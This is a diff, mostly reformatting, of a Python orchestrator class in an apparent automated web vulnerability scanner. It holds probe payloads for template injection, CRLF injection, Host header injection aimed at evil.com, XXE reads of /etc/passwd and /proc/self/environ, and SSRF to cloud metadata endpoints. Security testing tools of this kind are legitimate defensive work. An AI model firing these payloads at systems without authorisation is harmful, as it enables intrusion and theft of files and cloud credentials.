-                                ))
+                                target_url = (
+                                    candidate if isinstance(candidate, str) else candidate["action"]
+                                )
+                                findings.append(
+                                    Finding(
+                                        type="lfi_vulnerability",
+                                        value=f"LFI: {indicator_type} file exposed",
+                                        description=f"Local File Inclusion vulnerability detected. "
+                                        f"The server returned file contents containing '{indicator}'.",
+                                        severity="critical",
+                                        phase="exploit",
+                                        tool="lfi-test",
+                                        target=target_url,
+                                        metadata={
+                                            "payload": payload,
+                                            "indicator": indicator,
+                                            "indicator_type": indicator_type,
+                                        },
+                                    )
+                                )
                                 break  # Found LFI, move to next endpoint
 
                     except httpx.RequestError:
@@ -1465,8 +1532,8 @@ class Orchestrator:
 
         # Find parameters that might be vulnerable to SSTI
         ssti_param_patterns = [
-            r'[?&](template|name|message|text|content|title|subject|body|preview|render|format)=',
-            r'[?&](email|greeting|user|username|display|output|msg|comment)=',
+            r"[?&](template|name|message|text|content|title|subject|body|preview|render|format)=",
+            r"[?&](email|greeting|user|username|display|output|msg|comment)=",
         ]
 
         # Collect candidates
@@ -1479,15 +1546,20 @@ class Orchestrator:
 
         # Also check form parameters
         for form in self.discovered_forms:
-            for inp in form.get('inputs', []):
-                name = inp.get('name', '').lower()
-                if any(kw in name for kw in ['name', 'message', 'text', 'content', 'title', 'template', 'email']):
-                    ssti_candidates.append({
-                        'type': 'form',
-                        'action': form.get('action', self.target),
-                        'method': form.get('method', 'GET'),
-                        'param': inp.get('name'),
-                    })
+            for inp in form.get("inputs", []):
+                name = inp.get("name", "").lower()
+                if any(
+                    kw in name
+                    for kw in ["name", "message", "text", "content", "title", "template", "email"]
+                ):
+                    ssti_candidates.append(
+                        {
+                            "type": "form",
+                            "action": form.get("action", self.target),
+                            "method": form.get("method", "GET"),
+                            "param": inp.get("name"),
+                        }
+                    )
 
         if not ssti_candidates:
             logger.info("No potential SSTI parameters found")
@@ -1500,11 +1572,11 @@ class Orchestrator:
 
         # SSTI detection payloads with expected results
         detection_payloads = [
-            ("{{7*7}}", "49"),           # Jinja2, Twig
-            ("${7*7}", "49"),             # Freemarker, Velocity
-            ("#{7*7}", "49"),             # Thymeleaf
-            ("<%= 7*7 %>", "49"),         # ERB
-            ("{{7*'7'}}", "7777777"),     # Jinja2 string multiplication
+            ("{{7*7}}", "49"),  # Jinja2, Twig
+            ("${7*7}", "49"),  # Freemarker, Velocity
+            ("#{7*7}", "49"),  # Thymeleaf
+            ("<%= 7*7 %>", "49"),  # ERB
+            ("{{7*'7'}}", "7777777"),  # Jinja2 string multiplication
         ]
 
         async with httpx.AsyncClient(timeout=5.0, verify=False, follow_redirects=True) as client:
@@ -1512,43 +1584,47 @@ class Orchestrator:
                 for payload, expected in detection_payloads:
                     try:
                         if isinstance(candidate, dict):
-                            url = candidate['action']
-                            data = {candidate['param']: payload}
-                            if candidate['method'].upper() == 'POST':
+                            url = candidate["action"]
+                            data = {candidate["param"]: payload}
+                            if candidate["method"].upper() == "POST":
                                 response = await client.post(url, data=data, headers=auth_headers)
                             else:
                                 response = await client.get(url, params=data, headers=auth_headers)
                         else:
                             # Replace parameter value with payload
                             test_url = re.sub(
-                                r'([?&](template|name|message|text|content|title|email)=)[^&]*',
+                                r"([?&](template|name|message|text|content|title|email)=)[^&]*",
                                 lambda m: m.group(1) + payload,
                                 candidate,
-                                flags=re.IGNORECASE
+                                flags=re.IGNORECASE,
                             )
                             response = await client.get(test_url, headers=auth_headers)
 
                         # Check if template was executed (expected result appears)
                         if expected in response.text and payload not in response.text:
                             # Template executed - found SSTI!
-                            target_url = candidate if isinstance(candidate, str) else candidate['action']
+                            target_url = (
+                                candidate if isinstance(candidate, str) else candidate["action"]
+                            )
                             template_engine = self._detect_template_engine(payload)
-                            findings.append(Finding(
-                                type="ssti_vulnerability",
-                                value=f"SSTI: {template_engine} template injection",
-                                description=f"Server-Side Template Injection detected. "
-                                           f"Payload '{payload}' was executed, returning '{expected}'. "
-                                           f"This may lead to Remote Code Execution.",
-                                severity="critical",
-                                phase="exploit",
-                                tool="ssti-test",
-                                target=target_url,
-                                metadata={
-                                    "payload": payload,
-                                    "expected": expected,
-                                    "template_engine": template_engine,
-                                }
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="ssti_vulnerability",
+                                    value=f"SSTI: {template_engine} template injection",
+                                    description=f"Server-Side Template Injection detected. "
+                                    f"Payload '{payload}' was executed, returning '{expected}'. "
+                                    f"This may lead to Remote Code Execution.",
+                                    severity="critical",
+                                    phase="exploit",
+                                    tool="ssti-test",
+                                    target=target_url,
+                                    metadata={
+                                        "payload": payload,
+                                        "expected": expected,
+                                        "template_engine": template_engine,
+                                    },
+                                )
+                            )
                             break  # Found SSTI, move to next endpoint
 
                     except httpx.RequestError:
@@ -1591,19 +1667,15 @@ class Orchestrator:
             {"Host": f"{self.domain}.evil.com"},
             {"Host": "localhost"},
             {"Host": "127.0.0.1"},
-
             # X-Forwarded-Host (common in proxies)
             {"X-Forwarded-Host": "evil.com"},
             {"X-Forwarded-Host": "localhost"},
-
             # X-Host variations
             {"X-Host": "evil.com"},
             {"X-Original-Host": "evil.com"},
             {"X-Forwarded-Server": "evil.com"},
-
             # Double Host header
             {"Host": "evil.com", "X-Forwarded-Host": self.domain},
-
             # Port injection
             {"Host": f"{self.domain}:evil.com"},
             {"Host": f"{self.domain}@evil.com"},
@@ -1634,25 +1706,34 @@ class Orchestrator:
                         response_text = response.text.lower()
 
                         # Indicators of successful injection
-                        if any([
-                            injected_host.lower() in response_text,
-                            injected_host.lower() in response.headers.get("location", "").lower(),
-                            "evil.com" in response_text,
-                        ]):
-                            findings.append(Finding(
-                                type="host_header_injection",
-                                value="Host Header Injection Detected",
-                                description=f"The application reflects the injected Host header '{injected_host}'. "
-                                           f"This can lead to password reset poisoning, cache poisoning, or SSRF.",
-                                severity="high",
-                                phase="exploit",
-                                tool="host-header-injection",
-                                target=url,
-                                metadata={
-                                    "injected_header": payload_headers,
-                                    "reflected_in": "response_body" if injected_host.lower() in response_text else "location_header",
-                                }
-                            ))
+                        if any(
+                            [
+                                injected_host.lower() in response_text,
+                                injected_host.lower()
+                                in response.headers.get("location", "").lower(),
+                                "evil.com" in response_text,
+                            ]
+                        ):
+                            findings.append(
+                                Finding(
+                                    type="host_header_injection",
+                                    value="Host Header Injection Detected",
+                                    description=f"The application reflects the injected Host header '{injected_host}'. "
+                                    f"This can lead to password reset poisoning, cache poisoning, or SSRF.",
+                                    severity="high",
+                                    phase="exploit",
+                                    tool="host-header-injection",
+                                    target=url,
+                                    metadata={
+                                        "injected_header": payload_headers,
+                                        "reflected_in": (
+                                            "response_body"
+                                            if injected_host.lower() in response_text
+                                            else "location_header"
+                                        ),
+                                    },
+                                )
+                            )
                             break  # Found vulnerability, move to next URL
 
                     except httpx.RequestError:
@@ -1681,17 +1762,13 @@ class Orchestrator:
             "%0d%0aSet-Cookie:crlf=injection",
             "%0d%0aX-Injected:header",
             "\r\nX-Injected: header",
-
             # Double encoding
             "%250d%250aSet-Cookie:crlf=injection",
-
             # Mixed encoding
             "%0d%0a%0d%0a<script>alert(1)</script>",
             "%0d%0aLocation:https://evil.com",
-
             # Unicode variants
             "%E5%98%8A%E5%98%8DSet-Cookie:crlf=injection",
-
             # Header injection for XSS
             "%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>",
         ]
@@ -1699,11 +1776,11 @@ class Orchestrator:
         # Find parameters to test
         test_params = []
         for endpoint in self.discovered_endpoints:
-            if '?' in endpoint and '=' in endpoint:
+            if "?" in endpoint and "=" in endpoint:
                 test_params.append(endpoint)
 
         # Also test redirect parameters specifically
-        redirect_patterns = ['redirect', 'url', 'next', 'return', 'goto', 'location']
+        redirect_patterns = ["redirect", "url", "next", "return", "goto", "location"]
         for endpoint in self.discovered_endpoints:
             for pattern in redirect_patterns:
                 if pattern in endpoint.lower():
@@ -1725,54 +1802,60 @@ class Orchestrator:
                 for payload in crlf_payloads[:5]:
                     try:
                         # Inject payload into URL parameter
-                        test_url = re.sub(r'=([^&]*)', f'=\\1{payload}', endpoint)
+                        test_url = re.sub(r"=([^&]*)", f"=\\1{payload}", endpoint)
 
                         response = await client.get(test_url, headers=auth_headers)
 
                         # Check for CRLF indicators
                         # 1. Injected header appears in response headers
                         if "x-injected" in [h.lower() for h in response.headers.keys()]:
-                            findings.append(Finding(
-                                type="crlf_injection",
-                                value="CRLF Injection - Header Injection",
-                                description=f"CRLF injection allows arbitrary header injection. "
-                                           f"Payload: {payload}",
-                                severity="high",
-                                phase="exploit",
-                                tool="crlf-injection",
-                                target=endpoint,
-                                metadata={"payload": payload, "type": "header_injection"}
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="crlf_injection",
+                                    value="CRLF Injection - Header Injection",
+                                    description=f"CRLF injection allows arbitrary header injection. "
+                                    f"Payload: {payload}",
+                                    severity="high",
+                                    phase="exploit",
+                                    tool="crlf-injection",
+                                    target=endpoint,
+                                    metadata={"payload": payload, "type": "header_injection"},
+                                )
+                            )
                             break
 
                         # 2. Set-Cookie appears (cookie injection)
                         if "crlf=injection" in response.headers.get("set-cookie", ""):
-                            findings.append(Finding(
-                                type="crlf_injection",
-                                value="CRLF Injection - Cookie Injection",
-                                description=f"CRLF injection allows cookie injection. "
-                                           f"Payload: {payload}",
-                                severity="high",
-                                phase="exploit",
-                                tool="crlf-injection",
-                                target=endpoint,
-                                metadata={"payload": payload, "type": "cookie_injection"}
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="crlf_injection",
+                                    value="CRLF Injection - Cookie Injection",
+                                    description=f"CRLF injection allows cookie injection. "
+                                    f"Payload: {payload}",
+                                    severity="high",
+                                    phase="exploit",
+                                    tool="crlf-injection",
+                                    target=endpoint,
+                                    metadata={"payload": payload, "type": "cookie_injection"},
+                                )
+                            )
                             break
 
                         # 3. Response splitting (script in body from header area)
                         if "<script>" in response.text and "alert" in response.text:
-                            findings.append(Finding(
-                                type="crlf_injection",
-                                value="CRLF Injection - HTTP Response Splitting",
-                                description=f"CRLF injection leads to HTTP response splitting and XSS. "
-                                           f"Payload: {payload}",
-                                severity="critical",
-                                phase="exploit",
-                                tool="crlf-injection",
-                                target=endpoint,
-                                metadata={"payload": payload, "type": "response_splitting"}
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="crlf_injection",
+                                    value="CRLF Injection - HTTP Response Splitting",
+                                    description=f"CRLF injection leads to HTTP response splitting and XSS. "
+                                    f"Payload: {payload}",
+                                    severity="critical",
+                                    phase="exploit",
+                                    tool="crlf-injection",
+                                    target=endpoint,
+                                    metadata={"payload": payload, "type": "response_splitting"},
+                                )
+                            )
                             break
 
                     except httpx.RequestError:
@@ -1798,7 +1881,7 @@ class Orchestrator:
         # Find endpoints with parameters to test
         test_endpoints = []
         for endpoint in self.discovered_endpoints:
-            if '?' in endpoint and '=' in endpoint:
+            if "?" in endpoint and "=" in endpoint:
                 test_endpoints.append(endpoint)
 
         if not test_endpoints:
@@ -1811,7 +1894,7 @@ class Orchestrator:
             for endpoint in test_endpoints[:15]:
                 try:
                     # Parse the URL to get parameters
-                    from urllib.parse import urlparse, parse_qs, urlencode
+                    from urllib.parse import parse_qs, urlparse
 
                     parsed = urlparse(endpoint)
                     params = parse_qs(parsed.query)
@@ -1847,23 +1930,25 @@ class Orchestrator:
                             hpp_indicators.append("status_code_changed")
 
                         if hpp_indicators:
-                            findings.append(Finding(
-                                type="http_parameter_pollution",
-                                value=f"HPP: Parameter '{param_name}' may be vulnerable",
-                                description=f"HTTP Parameter Pollution detected on parameter '{param_name}'. "
-                                           f"Indicators: {', '.join(hpp_indicators)}. "
-                                           f"This may allow WAF bypass or logic manipulation.",
-                                severity="medium",
-                                phase="exploit",
-                                tool="hpp-test",
-                                target=endpoint,
-                                metadata={
-                                    "parameter": param_name,
-                                    "indicators": hpp_indicators,
-                                    "baseline_length": baseline_length,
-                                    "hpp_length": len(hpp_response.text),
-                                }
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="http_parameter_pollution",
+                                    value=f"HPP: Parameter '{param_name}' may be vulnerable",
+                                    description=f"HTTP Parameter Pollution detected on parameter '{param_name}'. "
+                                    f"Indicators: {', '.join(hpp_indicators)}. "
+                                    f"This may allow WAF bypass or logic manipulation.",
+                                    severity="medium",
+                                    phase="exploit",
+                                    tool="hpp-test",
+                                    target=endpoint,
+                                    metadata={
+                                        "parameter": param_name,
+                                        "indicators": hpp_indicators,
+                                        "baseline_length": baseline_length,
+                                        "hpp_length": len(hpp_response.text),
+                                    },
+                                )
+                            )
                             break  # Found HPP on this endpoint, move to next
 
                 except httpx.RequestError:
@@ -1889,7 +1974,10 @@ class Orchestrator:
             "AWS S3": ["NoSuchBucket", "The specified bucket does not exist"],
             "AWS CloudFront": ["Bad Request: ERROR: The request could not be satisfied"],
             "Azure": ["404 Web Site not found", "azure-dns.com"],
-            "GitHub Pages": ["There isn't a GitHub Pages site here", "For root URLs (like http://example.com/)"],
+            "GitHub Pages": [
+                "There isn't a GitHub Pages site here",
+                "For root URLs (like http://example.com/)",
+            ],
             "Heroku": ["No such app", "herokucdn.com/error-pages/no-such-app.html"],
             "Shopify": ["Sorry, this shop is currently unavailable"],
             "Tumblr": ["There's nothing here", "tumblr.com"],
@@ -1930,22 +2018,24 @@ class Orchestrator:
                     for service, fingerprints in takeover_fingerprints.items():
                         for fingerprint in fingerprints:
                             if fingerprint.lower() in response_text.lower():
-                                findings.append(Finding(
-                                    type="subdomain_takeover",
-                                    value=f"Subdomain Takeover: {service}",
-                                    description=f"Subdomain '{subdomain}' appears vulnerable to takeover. "
-                                               f"The DNS points to {service} but the resource is unclaimed. "
-                                               f"An attacker could claim this resource and serve malicious content.",
-                                    severity="critical",
-                                    phase="exploit",
-                                    tool="subdomain-takeover",
-                                    target=subdomain,
-                                    metadata={
-                                        "service": service,
-                                        "fingerprint": fingerprint,
-                                        "status_code": response.status_code,
-                                    }
-                                ))
+                                findings.append(
+                                    Finding(
+                                        type="subdomain_takeover",
+                                        value=f"Subdomain Takeover: {service}",
+                                        description=f"Subdomain '{subdomain}' appears vulnerable to takeover. "
+                                        f"The DNS points to {service} but the resource is unclaimed. "
+                                        f"An attacker could claim this resource and serve malicious content.",
+                                        severity="critical",
+                                        phase="exploit",
+                                        tool="subdomain-takeover",
+                                        target=subdomain,
+                                        metadata={
+                                            "service": service,
+                                            "fingerprint": fingerprint,
+                                            "status_code": response.status_code,
+                                        },
+                                    )
+                                )
                                 break  # Found, move to next subdomain
 
                 except httpx.RequestError as e:
@@ -1955,17 +2045,19 @@ class Orchestrator:
                         pass
                     elif "Connection refused" in str(e):
                         # Service not running - potential takeover
-                        findings.append(Finding(
-                            type="subdomain_takeover",
-                            value="Potential Subdomain Takeover (Connection Refused)",
-                            description=f"Subdomain '{subdomain}' has DNS but service is not responding. "
-                                       f"This may indicate a dangling record.",
-                            severity="medium",
-                            phase="exploit",
-                            tool="subdomain-takeover",
-                            target=subdomain,
-                            metadata={"error": str(e)}
-                        ))
+                        findings.append(
+                            Finding(
+                                type="subdomain_takeover",
+                                value="Potential Subdomain Takeover (Connection Refused)",
+                                description=f"Subdomain '{subdomain}' has DNS but service is not responding. "
+                                f"This may indicate a dangling record.",
+                                severity="medium",
+                                phase="exploit",
+                                tool="subdomain-takeover",
+                                target=subdomain,
+                                metadata={"error": str(e)},
+                            )
+                        )
                 except Exception as e:
                     logger.debug(f"Subdomain takeover test error for {subdomain}: {e}")
 
@@ -1986,32 +2078,56 @@ class Orchestrator:
         # XXE detection payloads (safe - don't exfiltrate data)
         detection_payloads = [
             # Entity expansion test
-            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "XXE_VULN_DETECTED">]><root>&xxe;</root>',
-             "XXE_VULN_DETECTED", "basic_entity"),
+            (
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe "XXE_VULN_DETECTED">]><root>&xxe;</root>',
+                "XXE_VULN_DETECTED",
+                "basic_entity",
+            ),
             # Parameter entity test
-            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % test "PARAM_ENTITY_WORKS">]><root>test</root>',
-             "PARAM_ENTITY", "param_entity"),
+            (
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % test "PARAM_ENTITY_WORKS">]><root>test</root>',
+                "PARAM_ENTITY",
+                "param_entity",
+            ),
         ]
 
         # File disclosure payloads (for confirmed vulnerable endpoints)
         file_payloads = [
-            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
-             ["root:", "nobody:", "/bin/bash", "/bin/sh"], "etc_passwd"),
-            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
-             None, "etc_hostname"),  # Any response indicates success
-            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
-             ["PATH=", "HOME=", "USER="], "proc_environ"),
+            (
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
+                ["root:", "nobody:", "/bin/bash", "/bin/sh"],
+                "etc_passwd",
+            ),
+            (
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><root>&xxe;</root>',
+                None,
+                "etc_hostname",
+            ),  # Any response indicates success
+            (
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>',
+                ["PATH=", "HOME=", "USER="],
+                "proc_environ",
+            ),
             # Windows
-            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
-             ["[fonts]", "[extensions]", "MAPI="], "win_ini"),
+            (
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>',
+                ["[fonts]", "[extensions]", "MAPI="],
+                "win_ini",
+            ),
         ]
 
         # SSRF via XXE payloads
         ssrf_payloads = [
-            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
-             ["ami-id", "instance-id", "local-ipv4"], "aws_metadata"),
-            ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><root>&xxe;</root>',
-             ["project", "instance"], "gcp_metadata"),
+            (
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>',
+                ["ami-id", "instance-id", "local-ipv4"],
+                "aws_metadata",
+            ),
+            (
+                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">]><root>&xxe;</root>',
+                ["project", "instance"],
+                "gcp_metadata",
+            ),
         ]
 
         # Content-Types that might accept XML
@@ -2033,10 +2149,19 @@ class Orchestrator:
 
         # Add common XML endpoints
         common_xml_endpoints = [
-            "/api/xml", "/api/v1/xml", "/soap", "/wsdl",
-            "/xmlrpc.php", "/xmlrpc", "/rss", "/feed",
-            "/api/import", "/import", "/upload",
-            "/api/config", "/config.xml",
+            "/api/xml",
+            "/api/v1/xml",
+            "/soap",
+            "/wsdl",
+            "/xmlrpc.php",
+            "/xmlrpc",
+            "/rss",
+            "/feed",
+            "/api/import",
+            "/import",
+            "/upload",
+            "/api/config",
+            "/config.xml",
         ]
         for endpoint in common_xml_endpoints:
             full_url = f"{self.target.rstrip('/')}{endpoint}"
@@ -2058,11 +2183,7 @@ class Orchestrator:
                                 "Accept": "application/xml, text/xml, */*",
                             }
 
-                            response = await client.post(
-                                endpoint,
-                                content=payload,
-                                headers=headers
-                            )
+                            response = await client.post(endpoint, content=payload, headers=headers)
 
                             response_text = response.text
 
@@ -2074,9 +2195,7 @@ class Orchestrator:
                                 for file_payload, file_markers, file_name in file_payloads:
                                     try:
                                         file_response = await client.post(
-                                            endpoint,
-                                            content=file_payload,
-                                            headers=headers
+                                            endpoint, content=file_payload, headers=headers
                                         )
                                         file_text = file_response.text
 
@@ -2088,22 +2207,26 @@ class Orchestrator:
                                             file_found = True
 
                                         if file_found:
-                                            findings.append(Finding(
-                                                type="xxe_file_disclosure",
-                                                value=f"XXE File Disclosure: {file_name}",
-                                                description=f"XML External Entity injection allows reading local files. "
-                                                           f"Endpoint '{endpoint}' is vulnerable to XXE attacks. "
-                                                           f"Attacker can read sensitive files like /etc/passwd, config files, etc.",
-                                                severity="critical",
-                                                phase="exploit",
-                                                tool="xxe-injection",
-                                                target=endpoint,
-                                                metadata={
-                                                    "payload_type": file_name,
-                                                    "content_type": content_type,
-                                                    "response_preview": file_text[:500] if file_text else None,
-                                                }
-                                            ))
+                                            findings.append(
+                                                Finding(
+                                                    type="xxe_file_disclosure",
+                                                    value=f"XXE File Disclosure: {file_name}",
+                                                    description=f"XML External Entity injection allows reading local files. "
+                                                    f"Endpoint '{endpoint}' is vulnerable to XXE attacks. "
+                                                    f"Attacker can read sensitive files like /etc/passwd, config files, etc.",
+                                                    severity="critical",
+                                                    phase="exploit",
+                                                    tool="xxe-injection",
+                                                    target=endpoint,
+                                                    metadata={
+                                                        "payload_type": file_name,
+                                                        "content_type": content_type,
+                                                        "response_preview": (
+                                                            file_text[:500] if file_text else None
+                                                        ),
+                                                    },
+                                                )
+                                            )
                                             break  # Found file disclosure, don't need more
 
                                     except Exception:
@@ -2113,27 +2236,27 @@ class Orchestrator:
                                 for ssrf_payload, ssrf_markers, ssrf_name in ssrf_payloads:
                                     try:
                                         ssrf_response = await client.post(
-                                            endpoint,
-                                            content=ssrf_payload,
-                                            headers=headers
+                                            endpoint, content=ssrf_payload, headers=headers
                                         )
                                         ssrf_text = ssrf_response.text
 
                                         if any(m in ssrf_text for m in ssrf_markers):
-                                            findings.append(Finding(
-                                                type="xxe_ssrf",
-                                                value=f"XXE SSRF: {ssrf_name}",
-                                                description=f"XXE can be used for Server-Side Request Forgery. "
-                                                           f"Attacker can access internal services and cloud metadata.",
-                                                severity="critical",
-                                                phase="exploit",
-                                                tool="xxe-injection",
-                                                target=endpoint,
-                                                metadata={
-                                                    "ssrf_type": ssrf_name,
-                                                    "content_type": content_type,
-                                                }
-                                            ))
+                                            findings.append(
+                                                Finding(
+                                                    type="xxe_ssrf",
+                                                    value=f"XXE SSRF: {ssrf_name}",
+                                                    description="XXE can be used for Server-Side Request Forgery. "
+                                                    "Attacker can access internal services and cloud metadata.",
+                                                    severity="critical",
+                                                    phase="exploit",
+                                                    tool="xxe-injection",
+                                                    target=endpoint,
+                                                    metadata={
+                                                        "ssrf_type": ssrf_name,
+                                                        "content_type": content_type,
+                                                    },
+                                                )
+                                            )
                                             break
 
                                     except Exception:
@@ -2183,9 +2306,17 @@ class Orchestrator:
 
         # Common API paths
         api_paths = [
-            "/api", "/api/v1", "/api/v2", "/graphql",
-            "/rest", "/data", "/ajax", "/json",
-            "/api/user", "/api/users", "/api/config",
+            "/api",
+            "/api/v1",
+            "/api/v2",
+            "/graphql",
+            "/rest",
+            "/data",
+            "/ajax",
+            "/json",
+            "/api/user",
+            "/api/users",
+            "/api/config",
         ]
         for path in api_paths:
             endpoints_to_test.append(f"{self.target.rstrip('/')}{path}")
@@ -2209,7 +2340,9 @@ class Orchestrator:
                         try:
                             options_response = await client.options(endpoint, headers=headers)
                             acao = options_response.headers.get("Access-Control-Allow-Origin", "")
-                            acac = options_response.headers.get("Access-Control-Allow-Credentials", "")
+                            acac = options_response.headers.get(
+                                "Access-Control-Allow-Credentials", ""
+                            )
                         except Exception:
                             acao = ""
                             acac = ""
@@ -2234,10 +2367,10 @@ class Orchestrator:
                             vuln_type = "cors_wildcard_credentials"
                             severity = "critical"
                             description = (
-                                f"CORS allows ANY origin with credentials! "
-                                f"Access-Control-Allow-Origin: * combined with "
-                                f"Access-Control-Allow-Credentials: true allows any website "
-                                f"to make authenticated requests and steal user data."
+                                "CORS allows ANY origin with credentials! "
+                                "Access-Control-Allow-Origin: * combined with "
+                                "Access-Control-Allow-Credentials: true allows any website "
+                                "to make authenticated requests and steal user data."
                             )
 
                         # Check for origin reflection (HIGH)
@@ -2265,9 +2398,9 @@ class Orchestrator:
                             vuln_type = "cors_null_origin"
                             severity = "high"
                             description = (
-                                f"CORS accepts 'null' origin! "
-                                f"Attackers can use sandboxed iframes or data: URLs "
-                                f"to send requests with null origin and bypass CORS."
+                                "CORS accepts 'null' origin! "
+                                "Attackers can use sandboxed iframes or data: URLs "
+                                "to send requests with null origin and bypass CORS."
                             )
 
                         # Check for wildcard (MEDIUM - unless with credentials)
@@ -2275,9 +2408,9 @@ class Orchestrator:
                             vuln_type = "cors_wildcard"
                             severity = "low"
                             description = (
-                                f"CORS allows any origin (wildcard). "
-                                f"While credentials are not allowed with wildcards, "
-                                f"this may expose non-sensitive data to any website."
+                                "CORS allows any origin (wildcard). "
+                                "While credentials are not allowed with wildcards, "
+                                "this may expose non-sensitive data to any website."
                             )
 
                         # Check for subdomain confusion
@@ -2291,21 +2424,23 @@ class Orchestrator:
                                 )
 
                         if vuln_type:
-                            findings.append(Finding(
-                                type=vuln_type,
-                                value=f"CORS Misconfiguration: {vuln_type.replace('_', ' ').title()}",
-                                description=description,
-                                severity=severity,
-                                phase="exploit",
-                                tool="cors-test",
-                                target=endpoint,
-                                metadata={
-                                    "tested_origin": origin,
-                                    "acao_header": acao,
-                                    "acac_header": acac,
-                                    "method": "GET/OPTIONS",
-                                }
-                            ))
+                            findings.append(
+                                Finding(
+                                    type=vuln_type,
+                                    value=f"CORS Misconfiguration: {vuln_type.replace('_', ' ').title()}",
+                                    description=description,
+                                    severity=severity,
+                                    phase="exploit",
+                                    tool="cors-test",
+                                    target=endpoint,
+                                    metadata={
+                                        "tested_origin": origin,
+                                        "acao_header": acao,
+                                        "acac_header": acac,
+                                        "method": "GET/OPTIONS",
+                                    },
+                                )
+                            )
                             # Found vuln at this endpoint, move to next
                             break
 
@@ -2484,11 +2619,13 @@ class Orchestrator:
             # Track this attempt
             if "exploit_attempts" not in self._checkpoint_results:
                 self._checkpoint_results["exploit_attempts"] = []
-            self._checkpoint_results["exploit_attempts"].append({
-                "target": target,
-                "tool": tool,
-                "success": result.recommendations.get("success", False),
-            })
+            self._checkpoint_results["exploit_attempts"].append(
+                {
+                    "target": target,
+                    "tool": tool,
+                    "success": result.recommendations.get("success", False),
+                }
+            )
 
             return result
 
@@ -2543,25 +2680,27 @@ class Orchestrator:
 
                         # Add findings for discovered hosts
                         for host in result.hosts[:50]:  # Limit to first 50
-                            findings.append(Finding(
-                                type="discovered_host",
-                                value=f"{host.ip}:{host.port}",
-                                description=f"ZoomEye: {host.service or 'Unknown'} on {host.ip}:{host.port}",
-                                severity="info",
-                                phase="recon",
-                                tool="zoomeye",
-                                target=host.domain or host.ip,
-                                metadata={
-                                    "ip": host.ip,
-                                    "port": host.port,
-                                    "service": host.service,
-                                    "app": host.app,
-                                    "version": host.version,
-                                    "country": host.country,
-                                    "org": host.org,
-                                    "title": host.title,
-                                }
-                            ))
+                            findings.append(
+                                Finding(
+                                    type="discovered_host",
+                                    value=f"{host.ip}:{host.port}",
+                                    description=f"ZoomEye: {host.service or 'Unknown'} on {host.ip}:{host.port}",
+                                    severity="info",
+                                    phase="recon",
+                                    tool="zoomeye",
+                                    target=host.domain or host.ip,
+                                    metadata={
+                                        "ip": host.ip,
+                                        "port": host.port,
+                                        "service": host.service,
+                                        "app": host.app,
+                                        "version": host.version,
+                                        "country": host.country,
+                                        "org": host.org,
+                                        "title": host.title,
+                                    },
+                                )
+                            )
 
                         # Save full results to JSON
                         zoomeye_data = {
@@ -2584,7 +2723,7 @@ class Orchestrator:
                                     "title": h.title,
                                 }
                                 for h in result.hosts
-                            ]
+                            ],
                         }
                         (self.output_dir / f"zoomeye_full_{self.domain}.json").write_text(
                             json.dumps(zoomeye_data, indent=2)
@@ -2594,7 +2733,8 @@ class Orchestrator:
                         self._log_tool(
                             f"ZoomEye - {result.total} results, {len(zoomeye_subdomains)} subdomains, "
                             f"{len(zoomeye_ips)} IPs, {len(result.services)} services",
-                            "done", tool_elapsed
+                            "done",
+                            tool_elapsed,
                         )
 
                         # Log summary of discovered services
@@ -2623,9 +2763,7 @@ class Orchestrator:
             self._log_tool("subfinder", "running")
             tool_start = time.time()
             # Security: Use safe_domain to prevent command injection
-            ret, output = await self._run_command(
-                f"subfinder -d {self.safe_domain} -silent"
-            )
+            ret, output = await self._run_command(f"subfinder -d {self.safe_domain} -silent")
             tool_elapsed = time.time() - tool_start
             if ret == 0:
                 subs = [s.strip() for s in output.split("\n") if s.strip()]
@@ -2635,16 +2773,16 @@ class Orchestrator:
                 self._log_tool(f"subfinder - {len(subs)} subdomains", "done", tool_elapsed)
             else:
                 errors.append(f"subfinder failed: {output[:100] if output else 'unknown error'}")
-                self._log_tool("subfinder", "error", tool_elapsed, output[:100] if output else "command failed")
+                self._log_tool(
+                    "subfinder", "error", tool_elapsed, output[:100] if output else "command failed"
+                )
 
         # Assetfinder
         if "assetfinder" in self.config.recon_tools:
             self._log_tool("assetfinder", "running")
             tool_start = time.time()
             # Security: Use safe_domain to prevent command injection
-            ret, output = await self._run_command(
-                f"assetfinder --subs-only {self.safe_domain}"
-            )
+            ret, output = await self._run_command(f"assetfinder --subs-only {self.safe_domain}")
             tool_elapsed = time.time() - tool_start
             if ret == 0:
                 subs = [s.strip() for s in output.split("\n") if s.strip()]
